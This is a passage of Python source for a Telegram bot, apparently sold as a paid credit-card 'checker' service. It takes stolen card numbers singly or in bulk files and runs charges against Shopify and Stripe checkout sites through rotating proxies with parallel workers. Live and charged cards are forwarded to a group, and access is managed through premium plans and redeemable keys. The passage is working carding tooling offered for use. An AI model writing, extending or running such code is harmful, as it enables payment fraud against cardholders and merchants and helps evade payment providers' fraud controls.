            "<code>/sto</code> <code>/msto</code> — Stripe\n"
            "<code>/whop</code> — Whop\n"
            "<code>/jio</code> — Jio\n"
            "<code>/setproxy</code> — Set proxy\n"
            "<code>/myproxy</code> — View proxies\n"
            "<code>/clearproxy</code> — Clear"
        ), buttons=get_back_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_contact":
        kb = [[Button.url("Contact", "https://t.me/ishanicarder", style="primary")],
              [Button.inline("Back", b"main_menu", style="danger")]]
        await event.edit(premium_emoji("<b>👤 Contact</b>\n\n@Ishanicarder"), buttons=kb, parse_mode='html')
        await event.answer(); return

    if data.startswith("plan_info_"):
        pn = data.replace("plan_info_", "")
        pd = PLAN_LIMITS.get(pn, {})
        txt = (
            f'<b>Plan: {pn}</b>\n\n'
            f'Single: {"✅" if pd.get("single") else "❌"}\n'
            f'Mass: {pd.get("mass", 0) if pd.get("mass", 0) < 100000 else "Unlimited"}\n'
            f'Proxy: {"✅" if pd.get("proxy") else "❌"}\n'
            f'Workers: {pd.get("workers", 5)}'
        )
        await event.edit(premium_emoji(txt), buttons=get_back_keyboard(b"menu_plans"), parse_mode='html')
        await event.answer(); return

    # Admin
    if data == "admin_panel":
        if not is_admin(uid): await event.answer("Admin only!", alert=True); return
        await event.edit(premium_emoji("<b>👑 ADMIN PANEL</b>"), buttons=get_admin_panel_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "adm_genkeys":
        await event.answer()
        await event.reply(premium_emoji("<code>/key days plan</code>"), parse_mode='html'); return

    if data == "adm_bot":
        await event.answer()
        cur = get_bot_status(); new = "off" if cur == "on" else "on"; set_bot_status(new)
        await event.reply(premium_emoji(f"{'🟢' if new=='on' else '🔴'} Bot is now <b>{new.upper()}</b>"), parse_mode='html'); return

    if data == "adm_addpremium": await event.answer(); await event.reply(premium_emoji("<code>/addpremium user_id</code>"), parse_mode='html'); return
    if data == "adm_rmpremium": await event.answer(); await event.reply(premium_emoji("<code>/removepremium user_id</code>"), parse_mode='html'); return
    if data == "adm_ban": await event.answer(); await event.reply(premium_emoji("<code>/ban user_id</code>"), parse_mode='html'); return
    if data == "adm_unban": await event.answer(); await event.reply(premium_emoji("<code>/unban user_id</code>"), parse_mode='html'); return

    if data == "adm_status":
        await event.answer()
        total = sum(1 for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json'))
        txt = (f'Status: <b>{get_bot_status().upper()}</b>\n'
               f'Users: {total}\nPremium: {len(load_premium_users())}\nBanned: {len(load_banned())}\n'
               f'Sites 1-5: {len(load_sites_1_5())}\nSites 10-20: {len(load_sites_10_20())}')
        await event.reply(premium_emoji(txt), parse_mode='html'); return

    if data == "adm_users":
        await event.answer()
        total = sum(1 for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json'))
        await event.reply(premium_emoji(f'👥 Total: {total}'), parse_mode='html'); return

    if data == "adm_premlist":
        await event.answer()
        pu = load_premium_users()
        if not pu: await event.reply(premium_emoji("No premium users."), parse_mode='html'); return
        txt = "<b>Premium Users:</b>\n\n" + "\n".join([f"{i}. <code>{u}</code>" for i, u in enumerate(pu, 1)])
        await event.reply(premium_emoji(txt), parse_mode='html'); return

    if data == "adm_plans":
        await event.answer()
        txt = "<b>Plans:</b>\n\n" + "\n".join([f"• {p} → Mass: {PLAN_LIMITS[p]['mass'] if PLAN_LIMITS[p]['mass'] < 100000 else 'Unlimited'}" for p in VALID_PLANS])
        await event.reply(premium_emoji(txt), parse_mode='html'); return

    if data == "adm_sites":
        await event.answer()
        await event.reply(premium_emoji(f'Sites 1-5: {len(load_sites_1_5())}\nSites 10-20: {len(load_sites_10_20())}\n\n<code>/site</code> — Add\n<code>/mysites</code> — List'), parse_mode='html'); return

    if data == "adm_broadcast":
        await event.answer()
        await event.reply(premium_emoji("<code>/broadcast message</code>"), parse_mode='html'); return

    if data == "site_range_1_5":
        await event.answer(); pending_site_range[uid] = {"range": "1_5"}
        await event.reply(premium_emoji("Send sites (one per line)"), parse_mode='html'); return
    if data == "site_range_10_20":
        await event.answer(); pending_site_range[uid] = {"range": "10_20"}
        await event.reply(premium_emoji("Send sites (one per line)"), parse_mode='html'); return

    if data.startswith("pr_1_5_") or data.startswith("pr_10_20_"):
        is15 = data.startswith("pr_1_5_")
        sites = load_sites_1_5() if is15 else load_sites_10_20()
        if not sites: await event.answer("No sites!", alert=True); return
        pending = pending_price_range.get(uid)
        if not pending: await event.answer("Expired!", alert=True); return
        action = pending.get('action')
        if action == 'sh':
            c = pending.get('cc'); del pending_price_range[uid]
            await event.answer("Checking...")
            await run_shopify_single(event, uid, c, sites)
        elif action == 'msh':
            cs = pending.get('cards', []); del pending_price_range[uid]
            await event.answer("Starting...")
            await run_shopify_mass(event, uid, sites, cs)
        return

# ---------- SHOPIFY ----------
async def run_shopify_single(event, uid, card, sites):
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji("❌ Set proxy: <code>/setproxy ip:port</code>"), parse_mode='html'); return
    t0 = time.time()
    sm = await event.respond(premium_emoji(f"⚡ Checking {card}"), parse_mode='html')
    try:
        r = await check_card_with_retry(card, sites, proxies, 1)
        el = time.time() - t0
        await save_user_stats(uid, r['status'] in ['Charged','Approved'])
        cn = await get_checker_mention(uid)
        gw = r.get('gateway','Shopify'); pr = r.get('price','0.98')
        if r['status'] == 'Charged':
            await send_hit_to_group(uid, card, r['message'], gw, 'Charged', pr)
        elif r['status'] == 'Approved':
            await send_hit_to_group(uid, card, r['message'], gw, 'Approved', pr)
        await send_check_result(uid, card, r['status'], r['message'], gw, pr, el, cn)
        try: await sm.delete()
        except: pass
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ {e}"), parse_mode='html')

async def run_shopify_mass(event, uid, sites, cards):
    if get_mass_limit(uid) == 0:
        await event.respond(premium_emoji("❌ Mass not allowed on your plan"), parse_mode='html'); return
    cards = cards[:get_mass_limit(uid)]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji("❌ Set proxy first: <code>/setproxy ip:port</code>"), parse_mode='html'); return

    workers = get_worker_count(uid)
    stop_kb = [[Button.inline("🛑 STOP", b"stop_mass", style="danger")]]
    sm = await event.respond(premium_emoji(f"⚡ Mass Start: {len(cards)}"), parse_mode='html', buttons=stop_kb)
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = True

    ar = {'total': len(cards), 'checked': 0, 'charged': [], 'approved': [], 'dead': []}
    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)
    lu = [time.time()]; cn = await get_checker_mention(uid); t0 = time.time()

    async def worker():
        while not q.empty():
            if session_key not in active_sessions: break
            try: c = q.get_nowait()
            except: break
            try: r = await check_card_with_retry(c, sites, proxies, 1)
            except: ar['checked'] += 1; continue
            ar['checked'] += 1
            gw = r.get('gateway','Shopify'); pr = r.get('price','0.98')
            if r['status'] == 'Charged':
                ar['charged'].append(r)
                await send_hit_to_group(uid, c, r['message'], gw, 'Charged', pr)
                await send_check_result(uid, c, 'Charged', r['message'], gw, pr, 0, cn)
            elif r['status'] == 'Approved':
                ar['approved'].append(r)
                await send_hit_to_group(uid, c, r['message'], gw, 'Approved', pr)
                await send_check_result(uid, c, 'Approved', r['message'], gw, pr, 0, cn)
            else: ar['dead'].append(r)
            if time.time() - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                lu[0] = time.time()
                try:
                    await sm.edit(premium_emoji(
                        f'⚡ <b>Shopify Mass</b>\n\n'
                        f'Progress: {ar["checked"]}/{ar["total"]}\n'
                        f'✅ Charged: {len(ar["charged"])}\n'
                        f'🔥 Live: {len(ar["approved"])}\n'
                        f'❌ Dead: {len(ar["dead"])}'
                    ), parse_mode='html', buttons=stop_kb)
                except: pass

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws, return_exceptions=True)
    if session_key in active_sessions: del active_sessions[session_key]
    try: await sm.delete()
    except: pass
    el = time.time() - t0; m, s = divmod(int(el), 60)
    hits = ""
    for r in ar['charged'][:5]: hits += f'✅ <code>{r["card"]}</code>\n'
    for r in ar['approved'][:5]: hits += f'🔥 <code>{r["card"]}</code>\n'
    if not hits: hits = "No hits"
    await event.respond(premium_emoji(
        f'⚡ <b>Complete</b>\n\nTotal: {ar["total"]}\nTime: {m:02d}:{s:02d}\n'
        f'✅ {len(ar["charged"])} | 🔥 {len(ar["approved"])} | ❌ {len(ar["dead"])}\n\nHits:\n{hits}'
    ), parse_mode='html')

# ---------- /sh /msh ----------
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def sh_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    ci = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(ci)
    if not cards: await event.reply(premium_emoji("❌ Bad CC"), parse_mode='html'); return
    pending_price_range[uid] = {'action': 'sh', 'cc': cards[0]}
    await event.reply(premium_emoji(f"CC: <code>{cards[0]}</code>\n\nSelect range:"), buttons=get_price_range_keyboard('sh'), parse_mode='html')

@bot.on(events.NewMessage(pattern='/msh'))
async def msh_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if not event.reply_to_msg_id: await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'):
        await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    fp = await rm.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: ct = await f.read()
    cards = extract_cc(ct)
    try: os.remove(fp)
    except: pass
    if not cards: await event.reply(premium_emoji("No cards"), parse_mode='html'); return
    ml = get_mass_limit(uid)
    if ml == 0: await event.reply(premium_emoji("Mass not allowed"), parse_mode='html'); return
    cards = cards[:ml]
    pending_price_range[uid] = {'action': 'msh', 'cards': cards}
    await event.reply(premium_emoji(f"Total: {len(cards)}\n\nSelect range:"), buttons=get_price_range_keyboard('msh'), parse_mode='html')

# ---------- /sto /msto ----------
@bot.on(events.NewMessage(pattern=r'^/sto\s+'))
async def sto_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    if not HITTER_AVAILABLE: await event.reply(premium_emoji("❌ hitter.py missing"), parse_mode='html'); return
    p = event.message.text.split(' ', 2)
    if len(p) < 3: await event.reply(premium_emoji("❌ <code>/sto URL CC</code>"), parse_mode='html'); return
    url = p[1].strip(); ci = p[2].strip()
    cards = extract_cc(ci)
    if not cards and len(ci.split('|')) == 4: cards = [ci]
    if not cards: await event.reply(premium_emoji("❌ Bad CC"), parse_mode='html'); return
    card = cards[0]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies: await event.reply(premium_emoji("❌ Set proxy first"), parse_mode='html'); return
    proxy = random.choice(proxies)
    sm = await event.respond(premium_emoji(f"⚡ Stripe Hitter...\n\n{card}"), parse_mode='html')
    t0 = time.time()
    try:
        ck = AsyncStripeChecker(url, proxy)
        if not await ck.prefetch():
            await ck.close(); await sm.edit(premium_emoji("❌ Prefetch failed"), parse_mode='html'); return
        p2 = card.split('|')
        cd = {"cc": p2[0], "month": p2[1], "year": p2[2][-2:], "cvv": p2[3], "full": card}
        r = await ck.charge_card(cd)
        await ck.close()
        el = time.time() - t0
        cn = await get_checker_mention(uid)
        amt = ck.amount_str; st = r.get('status', 'ERROR'); msg = r.get('message', '')
        if st == 'CHARGED':
            await send_hit_to_group(uid, card, msg, "Stripe", "Charged", amt)
            await send_check_result(uid, card, 'Charged', msg, "Stripe", amt, el, cn)
        elif st == 'LIVE':
            await send_hit_to_group(uid, card, msg, "Stripe", "Approved", amt)
            await send_check_result(uid, card, 'Approved', msg, "Stripe", amt, el, cn)
        elif st == '3DS':
            await send_check_result(uid, card, 'Approved', "3DS", "Stripe", amt, el, cn)
        elif st == 'HCAPTCHA':
            await send_check_result(uid, card, 'Dead', "Hcaptcha", "Stripe", amt, el, cn)
        else:
            await send_check_result(uid, card, 'Dead', msg or st, "Stripe", amt, el, cn)
        try: await sm.delete()
        except: pass
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/msto\s+'))
async def msto_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if not HITTER_AVAILABLE: await event.reply(premium_emoji("❌ hitter.py missing"), parse_mode='html'); return
    p = event.message.text.split(' ', 1)
    if len(p) < 2: await event.reply(premium_emoji("❌ <code>/msto URL</code> reply .txt"), parse_mode='html'); return
    url = p[1].strip()
    if not event.reply_to_msg_id: await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'):
        await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    fp = await rm.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: ct = await f.read()
    cards = extract_cc(ct)
    try: os.remove(fp)
    except: pass
    if not cards: await event.reply(premium_emoji("No cards"), parse_mode='html'); return
    ml = get_mass_limit(uid)
    if ml == 0: await event.reply(premium_emoji("Mass not allowed"), parse_mode='html'); return
    cards = cards[:ml]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies: await event.reply(premium_emoji("❌ Set proxy first"), parse_mode='html'); return
    proxy = random.choice(proxies)
    workers = max(1, min(10, len(proxies) * 2))
    stop_kb = [[Button.inline("🛑 STOP", b"stop_mass", style="danger")]]
    sm = await event.respond(premium_emoji(f"⚡ Stripe Mass: {len(cards)}"), parse_mode='html', buttons=stop_kb)
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = True
    ar = {'total': len(cards), 'checked': 0, 'charged': [], 'live': []}
    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)
    lu = [time.time()]; cn = await get_checker_mention(uid); t0 = time.time()

    async def worker():
        ck = None
        try:
            ck = AsyncStripeChecker(url, proxy)
            if not await ck.prefetch():
                await ck.close(); return
            while not q.empty():
                if session_key not in active_sessions: break
                try: c = q.get_nowait()
                except: break
                try:
                    p2 = c.split('|')
                    cd = {"cc": p2[0], "month": p2[1], "year": p2[2][-2:], "cvv": p2[3], "full": c}
                    r = await ck.charge_card(cd)
                except: ar['checked'] += 1; continue
                ar['checked'] += 1
                st = r.get('status', 'ERROR'); msg = r.get('message', '')
                amt = ck.amount_str
                if st == 'CHARGED':
                    ar['charged'].append(r)
                    await send_hit_to_group(uid, c, msg, "Stripe", "Charged", amt)
                    await send_check_result(uid, c, 'Charged', msg, "Stripe", amt, 0, cn)
                elif st == 'LIVE':
                    ar['live'].append(r)
                    await send_hit_to_group(uid, c, msg, "Stripe", "Approved", amt)
                    await send_check_result(uid, c, 'Approved', msg, "Stripe", amt, 0, cn)
                elif st in ('3DS', 'HCAPTCHA'): ar['live'].append(r)
                if time.time() - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                    lu[0] = time.time()
                    try:
                        await sm.edit(premium_emoji(
                            f'⚡ <b>Stripe Mass</b>\n\n'
                            f'Progress: {ar["checked"]}/{ar["total"]}\n'
                            f'✅ Charged: {len(ar["charged"])}\n'
                            f'🔥 Live: {len(ar["live"])}'
                        ), parse_mode='html', buttons=stop_kb)
                    except: pass
        finally:
            if ck: await ck.close()

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws, return_exceptions=True)
    if session_key in active_sessions: del active_sessions[session_key]
    try: await sm.delete()
    except: pass
    el = time.time() - t0; m, s = divmod(int(el), 60)
    hits = ""
    for r in ar['charged'][:5]: hits += f'✅ <code>{r["card"]}</code>\n'
    for r in ar['live'][:5]: hits += f'🔥 <code>{r["card"]}</code>\n'
    if not hits: hits = "No hits"
    await event.respond(premium_emoji(
        f'⚡ <b>Complete</b>\n\nTotal: {ar["total"]}\nTime: {m:02d}:{s:02d}\n'
        f'✅ {len(ar["charged"])} | 🔥 {len(ar["live"])}\n\nHits:\n{hits}'
    ), parse_mode='html')

# ---------- /setproxy /myproxy /clearproxy ----------
@bot.on(events.NewMessage(pattern=r'^/setproxy\s+'))
async def setproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    a = event.message.text.split(' ', 1)
    if len(a) < 2:
        await event.reply(premium_emoji(
            "<b>Proxy Format:</b>\n"
            "<code>/setproxy ip:port</code>\n"
            "<code>/setproxy ip:port:user:pass</code>\n"
            "<code>/setproxy user:pass@ip:port</code>\n"
            "<code>/setproxy socks5://user:pass@ip:port</code>"
        ), parse_mode='html'); return
    proxy_str = a[1].strip()
    msg = await event.reply(premium_emoji("⏳ Testing proxy..."), parse_mode='html')
    loop = asyncio.get_event_loop()
    ok, country, ip = await loop.run_in_executor(None, test_proxy_connection, proxy_str)
    if not ok:
        await msg.edit(premium_emoji(
            f'[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝗗𝗲𝗮𝗱 ⌁ ❌\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗥𝗲𝗮𝘀𝗼𝗻 ⌁ Connection timeout'
        ), parse_mode='html'); return
    lst = load_user_proxies(uid, "shopify")
    added = 0
    if proxy_str not in lst:
        lst.append(proxy_str); added = 1
        save_user_proxies(uid, lst, "shopify")
    total = len(lst)
    workers = max(1, min(30, total * 3))
    await msg.edit(premium_emoji(
        f'[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝗦𝗮𝘃𝗲𝗱 ⌁ ✅\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] Added ⌁ {added}\n'
        f'[⌯] Total ⌁ {total}/30\n'
        f'[⌯] Workers ⌁ {workers}\n'
        f'[⌯] Country ⌁ {country}\n'
        f'[⌯] IP ⌁ <code>{ip}</code>'
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy\b'))
async def myproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    lst = load_user_proxies(uid, "shopify")
    if not lst:
        await event.reply(premium_emoji("❌ No proxy set. Use <code>/setproxy</code>"), parse_mode='html'); return
    workers = max(1, min(30, len(lst) * 3))
    txt = "\n".join([f'{i+1}. <code>{p[:60]}</code>' for i, p in enumerate(lst[:10])])
    await event.reply(premium_emoji(
        f'[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝗦𝗲𝘁 ⌁ ✅\n'
        f'[⌯] Total ⌁ {len(lst)}/30\n'
        f'[⌯] Workers ⌁ {workers}\n\n{txt}'
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy\b'))
async def clearproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    save_user_proxies(uid, [], "shopify")
    save_user_proxies(uid, [], "whop")
    save_user_proxies(uid, [], "hitter")
    await event.reply(premium_emoji("✅ All proxies cleared"), parse_mode='html')

# ---------- /key ----------
@bot.on(events.NewMessage(pattern=r'^/key\s+'))
async def key_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 3:
        await event.reply(premium_emoji("<code>/key days plan</code>"), parse_mode='html'); return
    try: days = int(a[1])
    except: await event.reply(premium_emoji("Bad days"), parse_mode='html'); return
    plan = " ".join(a[2:]).strip()
    if plan not in VALID_PLANS:
        await event.reply(premium_emoji(f"Plans: {', '.join(VALID_PLANS)}"), parse_mode='html'); return
    kd = load_json_file(KEYS_FILE, {})
    key = "BARK-" + generate_key(12)
    while key in kd: key = "BARK-" + generate_key(12)
    kd[key] = {'plan': plan, 'days': days, 'created_by': event.sender_id,
               'created_at': datetime.now().isoformat(), 'used_by': None}
    save_json_file(KEYS_FILE, kd)
    await event.reply(premium_emoji(
        f"<b>Key Generated</b>\n\n"
        f"Key: <code>{key}</code>\n"
        f"Plan: <b>{plan}</b>\n"
        f"Days: <b>{days}</b>"
    ), parse_mode='html')

# ---------- /redeem ----------
@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    a = event.message.text.split()
    if len(a) < 2: await event.reply(premium_emoji("<code>/redeem KEY</code>"), parse_mode='html'); return
    key = a[1].strip().upper()
    kd = load_json_file(KEYS_FILE, {})
    if key not in kd: await event.reply(premium_emoji("❌ Invalid key"), parse_mode='html'); return
    if kd[key].get('used_by'): await event.reply(premium_emoji("❌ Already used"), parse_mode='html'); return
    plan = kd[key].get('plan', 'Free'); days = kd[key].get('days', 30)
    kd[key]['used_by'] = uid; kd[key]['used_at'] = datetime.now().isoformat()
    save_json_file(KEYS_FILE, kd)
    set_user_plan(uid, plan, days)
    pu = load_premium_users()
    if str(uid) not in pu:
        with open(PREMIUM_FILE, 'a', encoding='utf-8') as f: f.write(f"{uid}\n")
    await event.reply(premium_emoji(
        f"✅ <b>Key Redeemed!</b>\n\nPlan: <b>{plan}</b>\nDays: <b>{days}</b>"
    ), parse_mode='html')

# ---------- /stop ----------
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    uid = event.sender_id
    n = 0
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_"): del active_sessions[k]; n += 1
    await event.reply(premium_emoji(f"✅ Stopped {n}" if n else "❌ None"), parse_mode='html')

# ---------- ADMIN ----------
@bot.on(events.NewMessage(pattern=r'^/bot\s+(on|off)$'))
async def bot_toggle(event):
    if not is_admin(event.sender_id): return
    s = event.message.text.split()[1].lower(); set_bot_status(s)
    await event.reply(premium_emoji(f"Bot {s.upper()}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
async def ban_cmd(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip()
    if t in load_banned(): await event.reply(premium_emoji("Already banned"), parse_mode='html'); return
    with open(BANNED_FILE, 'a') as f: f.write(f"{t}\n")
    await event.reply(premium_emoji(f"🚫 {t} banned"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
async def unban_cmd(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip(); b = load_banned()
    if t not in b: await event.reply(premium_emoji("Not banned"), parse_mode='html'); return
    with open(BANNED_FILE, 'w') as f:
        for x in b:
            if x != t: f.write(f"{x}\n")
    await event.reply(premium_emoji("✅ Unbanned"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_prem(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip()
    if t in load_premium_users(): await event.reply(premium_emoji("Already premium"), parse_mode='html'); return
    with open(PREMIUM_FILE, 'a') as f: f.write(f"{t}\n")
    await event.reply(premium_emoji(f"✅ {t} is premium"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def rm_prem(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip(); pu = load_premium_users()
    if t not in pu: await event.reply(premium_emoji("Not premium"), parse_mode='html'); return
    with open(PREMIUM_FILE, 'w') as f:
        for u in pu:
            if u != t: f.write(f"{u}\n")
    plans = load_json_file(USER_PLANS_FILE, {})
    if t in plans: del plans[t]; save_json_file(USER_PLANS_FILE, plans)
    await event.reply(premium_emoji("✅ Removed"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split(' ', 1)
    if len(a) < 2: return
    msg = a[1].strip(); sent = 0; failed = 0
    for f in os.listdir('.'):
        if f.startswith('user_') and f.endswith('.json'):
            try:
                u_id = int(f.replace('user_', '').replace('.json', ''))
                await bot.send_message(u_id, premium_emoji(f"📢 {msg}"), parse_mode='html')
                sent += 1; await asyncio.sleep(0.05)
            except: failed += 1
    await event.reply(premium_emoji(f"Sent: {sent} | Failed: {failed}"), parse_mode='html')

# ---------- SITE ----------
@bot.on(events.NewMessage(pattern=r'^/site\b'))
async def site_cmd(event):
    if not is_premium(event.sender_id) and not is_admin(event.sender_id): return
    await event.reply(premium_emoji("Select range:"), buttons=get_site_range_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_cmd(event):
    if not is_premium(event.sender_id) and not is_admin(event.sender_id): return
    s1 = load_sites_1_5(); s2 = load_sites_10_20()
    await event.reply(premium_emoji(
        f"Sites 1-5 ({len(s1)}):\n" + "\n".join([f"• {s}" for s in s1[:20]]) +
        f"\n\nSites 10-20 ({len(s2)}):\n" + "\n".join([f"• {s}" for s in s2[:20]])
    ), parse_mode='html')

@bot.on(events.NewMessage)
async def site_add_handler(event):
    uid = event.sender_id
    if uid not in pending_site_range: return
    if not event.message.text or event.message.text.startswith('/'): return
    rng = pending_site_range.get(uid, {}).get("range")
    if not rng: return
    del pending_site_range[uid]
    lines = event.message.text.strip().split('\n')
    sites = [l.strip().replace('https://','').replace('http://','').rstrip('/') for l in lines if '.' in l]
    if not sites: await event.reply(premium_emoji("No valid sites"), parse_mode='html'); return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies: await event.reply(premium_emoji("Set proxy first"), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"Testing {len(sites)}..."), parse_mode='html')
    alive = []; dead = []
    for s in sites:
        r = await test_site(s, random.choice(proxies))
        if r['status'] == 'alive': alive.append(s)
        else: dead.append(s)
    added = 0
    if rng == "1_5":
        cur = load_sites_1_5()
        new = [s for s in alive if s not in cur]
        with open(SITES_1_5_FILE, 'a') as f:
            for s in new: f.write(f"{s}\n")
        added = len(new)
    else:
        cur = load_sites_10_20()
        new = [s for s in alive if s not in cur]
        with open(SITES_10_20_FILE, 'a') as f:
            for s in new: f.write(f"{s}\n")
        added = len(new)
    await sm.edit(premium_emoji(f"Range: {rng}\nTotal: {len(sites)}\nAlive: {len(alive)}\nDead: {len(dead)}\nAdded: {added}"), parse_mode='html')

# ---------- STARTUP ----------
async def auto_add_admins():
    for a in ADMIN_IDS:
        if str(a) not in load_premium_users():
            with open(PREMIUM_FILE, 'a') as f: f.write(f"{a}\n")

if __name__ == "__main__":
    bot.loop.run_until_complete(auto_add_admins())
    print("="*50)
    print("✅ BarkBot STARTED!")
    print("🚀 /sh /msh /sto /msto")
    print("🔌 /setproxy /myproxy /clearproxy")
    print("🔑 /key days plan")
    print("👑 /admin")
    print("="*50)
    bot.run_until_disconnected()
